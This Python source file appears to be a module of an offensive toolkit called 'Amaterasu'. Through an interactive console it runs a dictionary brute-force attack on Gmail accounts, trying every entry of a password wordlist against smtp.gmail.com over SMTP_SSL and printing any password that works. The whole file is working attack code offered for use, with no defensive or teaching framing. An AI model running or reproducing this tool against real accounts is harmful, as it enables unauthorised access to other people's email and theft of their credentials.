#coding: utf-8
#!/usr/bin/python3

from huepy import *
import smtplib
import sys

def gmail_bruteforce_CONFIG():
	target = ''
	passwords = ''
	port = ''

	while True:
		user = input(bold(red('\nAMATERASU ')) + '(' + bold(lightcyan('gmail_bruteforce')) + ')' + '> ')
		if user.startswith('set'):
			try:
				if user.split(' ')[1] == 'target' or user.split(' ')[1] == 'TARGET':
					target = user.split(' ')[2]
					print(bold(info('Target set: ' + target)))
				elif user.split(' ')[1] == 'port' or user.split(' ')[1] == 'PORT':
					port = user.split(' ')[2]
					print(bold(info('Port set: ' + port)))
				elif user.split(' ')[1] == 'passwords' or user.split(' ')[1] == 'PASSWORDS':
					passwords = user.split(' ')[2]
					print(bold(info('Password wordlist set: ' + passwords)))
				else:
					print(bold(bad('Error: option do not exist.')))
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('port\tset port PORT (default: 465)')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
			except IndexError:
				print(bold(info('Select what to set.\n')))
				print(bold(info('target\tset target TARGET')))
				print(bold(info('port\tset port PORT (default: 465)')))
				print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
		elif user.startswith('show'):
			try:
				if user.split(' ')[1] == 'config':
					print()
					sConfig = {'Target': target,
					'Port': port,
					'Password wordlist': passwords}
					print(bold('CONFIG\t\t\tVALUE'))
					print(bold('------\t\t\t-----'))
					for a, b in sConfig.items():
						if len(a) > 15:
							print(bold(a + '\t' + b))
						elif len(a) <= 6:
							print(bold(a + '\t\t\t' + b))
						else:
							print(bold(a + '\t\t' + b))
				elif user.split(' ')[1] == 'options':
					print()
					sOptions = {'set target [TARGET]': 'Target',
					'set port [PORT]': 'set port to use for smtp connection',
					'set passwords [PASSWORDS]': 'set password wordlist'}
					print(bold('COMMAND\t\t\tDESCRIPTION'))
					print(bold('-------\t\t\t-----------'))
					for a, b in sOptions.items():
						if len(a) > 15:
							print(bold(a + '\t' + b))
						elif len(a) <= 6:
							print(bold(a + '\t\t\t' + b))
						else:
							print(bold(a + '\t\t' + b))
				else:
					print(bold(bad('Error: option do not exist.')))
			except IndexError:
				print(bold(info('Select what to show.\n')))
				print(bold(info('Config\t\tshow config')))
				print(bold(info('Options\t\tshow options')))
		elif user.startswith('run'):
			if port is None:
				port = '465'
			else:
				port = port
			try:
				gmail_bruteforce(target, passwords, port)
			except Exception as e:
				print(bold(bad('Error: {}'.format(e))))
		elif user == '?' or user == 'help':
			sHelp = {'help | ?':'print this help message.',
			'show (config|options)':'show configuration or options',
			'set target': 'set target to scan',
			'set passwords': 'set password file to use',
			'set port': 'set port for smtp connection',
			'run':'execute module',
			'back':'back to menu',
			'exit':'quit from Amaterasu'}
			print()
			print(bold('COMMAND\t\t\tDESCRIPTION'))
			print(bold('-------\t\t\t-----------'))
			for a, b in sHelp.items():
				if len(a) > 15:
					print(bold(a + '\t' + b))
				elif len(a) <= 6:
					print(bold(a + '\t\t\t' + b))
				else:
					print(bold(a + '\t\t' + b))
		elif user == 'back':
			break
		elif user == 'exit':
			print(bold(good('Thanks for using Amaterasu.')))
			sys.exit()

def gmail_bruteforce(target, passwords, port):
	passw = open(passwords, 'r')

	for password in passw:
		try:
			server = smtplib.SMTP_SSL('smtp.gmail.com', port)
			server.login(target, password)
			print(bold(bad('Sucess.')))
			print(bold(bad('Username found: ' + target)))
			print(bold(good('Password found: ' + password)))
			break
		except smtplib.SMTPAuthenticationError:
			print(bold(bad('Failed.')))
			print(bold(bad('Username failed: ' + target)))
			print(bold(bad('Password failed: ' + password)))
		except Exception as e:
			print(bold(bad('Error: {}'.format(e))))
